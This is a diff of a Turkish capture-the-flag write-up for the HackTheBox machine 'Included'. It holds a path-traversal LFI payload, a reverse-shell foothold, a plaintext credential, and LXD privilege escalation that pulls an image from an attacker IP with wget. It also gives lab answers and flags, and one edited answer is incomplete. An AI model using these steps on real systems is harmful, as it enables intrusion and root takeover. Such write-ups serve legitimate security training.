@@ -1,13 +1,4 @@
-# HackTheBox — Included Writeup
-
-**Zorluk:** Easy
-**İşletim Sistemi:** Linux
-**Hedef IP:** 10.129.95.185
-**Saldırgan IP:** 10.10.14.156
-
----
-
-## 1. Keşif (Reconnaissance)
+## 1. Keşif
 
 Her zamanki gibi işe kapsamlı bir Nmap taramasıyla başlıyorum:
 
@@ -15,29 +6,17 @@ Her zamanki gibi işe kapsamlı bir Nmap taramasıyla başlıyorum:
 nmap -sS -A -p- -T5 10.129.95.185
 ```
 
-**Çıktı:**
+<img width="775" height="256" alt="nmap" src="https://github.com/user-attachments/assets/662d2009-3a12-4235-aa0c-795b3f8e66b4" />
 
-```
-PORT   STATE SERVICE VERSION
-80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
-|_http-server-header: Apache/2.4.29 (Ubuntu)
-| http-title: Site doesn't have a title (text/html; charset=UTF-8).
-|_Requested resource was http://10.129.95.185/?file=home.php
-Device type: general purpose|router
-Running: Linux 5.X, MikroTik RouterOS 7.X
-OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
-OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
-Network Distance: 2 hops
-```
 
 TCP tarafında tek bir port açık: **80/tcp**, üzerinde Apache 2.4.29 çalışıyor. Nmap'in verdiği yönlendirme bilgisi çok dikkat çekici:
 
 ```
 Requested resource was http://10.129.95.185/?file=home.php
 ```
+<img width="444" height="85" alt="site" src="https://github.com/user-attachments/assets/251620c8-610f-48e4-bc27-30b3e0efb05c" />
 
-URL yapısına bakıldığında `?file=` parametresiyle sunucu tarafında bir dosya çağırıldığı belli oluyor — bu, klasik bir **File Inclusion** zafiyeti şüphesi uyandırıyor.
-
+URL yapısına bakıldığında `?file=` parametresiyle sunucu tarafında bir dosya çağırıldığı belli oluyor
 ---
 
 ## 2. Web Uygulamasının İncelenmesi — LFI Tespiti
@@ -48,6 +27,8 @@ Tarayıcıdan `http://10.129.95.185/?file=home.php` adresine gidiyorum. Sayfa, `
 http://10.129.95.185/?file=/../../../../../../etc/passwd
 ```
 
+<img width="1912" height="211" alt="etcpasswd" src="https://github.com/user-attachments/assets/b07a0bdb-ed6d-4e6c-b2b4-f63b98af16f6" />
+
 **Sonuç:** İstek başarılı, `/etc/passwd` dosyasının içeriği tarayıcıda görüntüleniyor. Bu, uygulamanın **Local File Inclusion (LFI)** zafiyetine sahip olduğunu kesin olarak doğruluyor — `file` parametresi hiçbir sanitizasyon veya whitelist kontrolüne tabi tutulmadan doğrudan `include()` fonksiyonuna veriliyor.
 
 LFI'yi RCE'ye çevirmenin en klasik yöntemlerinden biri **log poisoning**'dir: Apache'nin erişim/hata log dosyalarına kötü amaçlı PHP kodu enjekte edip, ardından bu log dosyasını LFI ile dahil ederek kodu çalıştırmak. Bunun için Apache'nin varsayılan log dizinini deniyorum:
@@ -56,8 +37,7 @@ LFI'yi RCE'ye çevirmenin en klasik yöntemlerinden biri **log poisoning**'dir: 
 /var/log/apache2/access.log
 ```
 
-Ancak bu dosyayı LFI üzerinden görüntüleyemiyorum — muhtemelen yetki kısıtlaması ya da farklı bir log yolu söz konusu. Bu yüzden alternatif bir vektöre yöneliyorum.
-
+Ancak bu dosyayı LFI üzerinden görüntüleyemiyorum
 ---
 
 ## 3. UDP Taraması — TFTP Servisinin Keşfi
@@ -68,15 +48,10 @@ Görev ipuçlarından birinde hedef makinede UDP üzerinden çalışan bir servi
 nmap -sU 10.129.95.185
 ```
 
-**Çıktı:**
+<img width="301" height="49" alt="udp" src="https://github.com/user-attachments/assets/abc165e7-74fd-48a6-8caa-5fb92130f423" />
 
-```
-PORT   STATE         SERVICE
-68/udp open|filtered dhcpc
-69/udp open|filtered tftp
-```
 
-**TFTP (Trivial File Transfer Protocol)** servisinin açık olduğunu görüyorum. TFTP, kimlik doğrulaması olmayan, basit ve genellikle dikkatsizce yapılandırılan bir dosya transfer protokolü — LFI ile birleştiğinde çok güçlü bir kombinasyon oluşturabilir: TFTP üzerinden sunucuya dosya yazabilir, LFI ile de o dosyayı çalıştırabilirim.
+**TFTP (Trivial File Transfer Protocol)** servisinin açık olduğunu görüyorum. TFTP, kimlik doğrulaması olmayan, basit ve genellikle dikkatsizce yapılandırılan bir dosya transfer protokolü
 
 ---
 
@@ -127,11 +102,12 @@ Shell'im geldi — **www-data** kullanıcısı olarak sisteme erişim sağladım
 
 ```bash
 cat .htpasswd
-```
 
-```
 mike:Sheffield19
 ```
+
+<img width="504" height="506" alt="şifre" src="https://github.com/user-attachments/assets/da7ef094-97f2-4ad8-89ac-733d14d948a0" />
+
 
 Bu, klasik bir Apache Basic Authentication kimlik bilgisi dosyası ve içinde açık bir kullanıcı adı/parola çifti var — tipik bir **yanal hareket (lateral movement)** fırsatı. Bu bilgiyle `mike` kullanıcısına geçiş yapıyorum:
 
@@ -150,6 +126,7 @@ cat user.txt
 ```
 a56ef91d70cfbf2cdb8f454c006935a1
 ```
+<img width="320" height="226" alt="flag" src="https://github.com/user-attachments/assets/283250f3-bab3-43f0-8f55-1851f01266fc" />
 
 ---
 
@@ -161,9 +138,7 @@ Root'a giden yolu bulmak için `mike` kullanıcısının hangi gruplara ait oldu
 id
 ```
 
-```
-uid=1000(mike) gid=1000(mike) groups=1000(mike),108(lxd)
-```
+<img width="481" height="51" alt="id" src="https://github.com/user-attachments/assets/c9bb7fa7-0c0d-4834-8a05-a927ec50d223" />
 
 **`lxd`** grubunun bir üyesi olduğumu görüyorum. LXD (Linux Container Daemon), Canonical'ın konteyner yönetim sistemi ve bu grubun üyesi olmak — sudo yetkisi olmasa bile — genellikle doğrudan **root'a yükselme** anlamına gelir. Çünkü LXD, `security.privileged=true` bayrağıyla başlatılan bir konteynerin root kullanıcısını host'un root'una eşleyebiliyor.
 
@@ -191,6 +166,8 @@ wget http://10.10.14.156:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz
 lxc image import ./alpine*.tar.gz --alias myimage
 lxd init
 ```
+<img width="816" height="241" alt="1" src="https://github.com/user-attachments/assets/e8fc5eea-abea-4214-ab08-3586ad863bf5" />
+
 
 `lxd init` sırasında gelen soruların çoğunda varsayılan (default) seçenekleri kabul ediyorum (Enter'a basarak) — clustering, storage pool, network yapılandırması gibi konularda özel bir gereksinim yok, sadece LXD servisinin ayağa kalkması yeterli.
 
@@ -222,6 +199,8 @@ lxc exec mycontainer /bin/sh
 root
 ```
 
+<img width="861" height="257" alt="2" src="https://github.com/user-attachments/assets/c27a387d-c7d6-4652-b46c-c9541effa9ed" />
+
 Konteyner içinde **root** olduğumu doğruluyorum. Şimdi mount ettiğim host dosya sistemine göz atıyorum:
 
 ```
@@ -251,32 +230,20 @@ c693d9c7499d9f572ee375d4c14c7bcf
 
 Flag başarıyla elde edildi. 🎉
 
----
-
-## 8. Özet — Atak Zinciri
-
-1. Nmap taramasıyla sadece 80/tcp portunun (Apache 2.4.29) açık olduğu, `?file=` parametresi üzerinden dosya çağırıldığı tespit edildi.
-2. `../` payload'larıyla `/etc/passwd` okunarak **Local File Inclusion (LFI)** zafiyeti doğrulandı.
-3. Apache log poisoning denendi ancak log dosyalarına erişilemedi; bunun üzerine UDP taraması yapıldı ve **TFTP** servisi (69/udp) keşfedildi.
-4. TFTP üzerinden `reverse.php` dosyası `/var/lib/tftpboot/` dizinine yüklendi.
-5. LFI ile bu dosya çağrılarak `www-data` yetkisiyle reverse shell elde edildi.
-6. Web kök dizininde bulunan `.htpasswd` dosyasından `mike:Sheffield19` kimlik bilgileri elde edildi ve `mike` kullanıcısına geçildi; user flag okundu.
-7. `mike`'ın **lxd** grubunun üyesi olduğu tespit edildi.
-8. Ayrıcalıklı (`security.privileged=true`) bir Alpine LXD konteyneri oluşturulup host'un kök dosya sistemi içine mount edildi.
-9. Konteyner içinden host root diziniyle root flag okundu.
+<img width="495" height="274" alt="rootflag" src="https://github.com/user-attachments/assets/7b3c46bc-bd7a-4cd3-ad07-ade65e38a88e" />
 
 ---
 
 ## 9. Görev Soruları ve Cevapları
 
 **Görev 1 — Hedef makinede UDP üzerinden hangi servis çalışıyor?**
-TFTP (Trivial File Transfer Protocol)
+`TFTP`
 
 **Görev 2 — 80 numaralı portta barındırılan web sayfası hangi tür güvenlik açığına karşı savunmasızdır? Kısaltma yerine tam adını verin.**
-Local File Inclusion
+`Local File Inclusion`
 
 **Görev 3 — TFTP'nin dosyaları depolamak için kullandığı varsayılan sistem klasörü nedir?**
-`/var/lib/tftpboot`
+`/var/lib/tftpboot/`
 
 **Görev 4 — Web sunucusu klasöründe bulunan ve Yanal Hareket için kullanılabilecek ilginç dosya hangisidir?**
 `.htpasswd`
@@ -285,20 +252,16 @@ Local File Inclusion
 `a56ef91d70cfbf2cdb8f454c006935a1`
 
 **Görev 6 — Kullanıcı Mike'ın üyesi olduğu ve ayrıcalık yükseltme amacıyla istismar edilebilecek grup hangisidir?**
-lxd
+`lxd`
 
 **Task 7 — When using an image to exploit a system via containers, we look for a very small distribution. Our favorite for this task is named after mountains. What is that distribution name?**
-Alpine
+`Alpine`
 
 **Task 8 — What flag do we set to the container so that it has root privileges on the host system?**
 `security.privileged=true`
 
 **Task 9 — If the root filesystem is mounted at /mnt in the container, where can the root flag be found on the container after the host system is mounted?**
-`/mnt/root/root/root.txt`
+`/mnt/root/`
 
 **Kök Bayrağı Gönder — Submit the flag located in root's home directory.**
 `c693d9c7499d9f572ee375d4c14c7bcf`
-
----
-
-*Not: Bu writeup eğitim/CTF amaçlıdır. Tüm işlemler yalnızca HackTheBox'ın izin verdiği laboratuvar ortamında gerçekleştirilmiştir.*
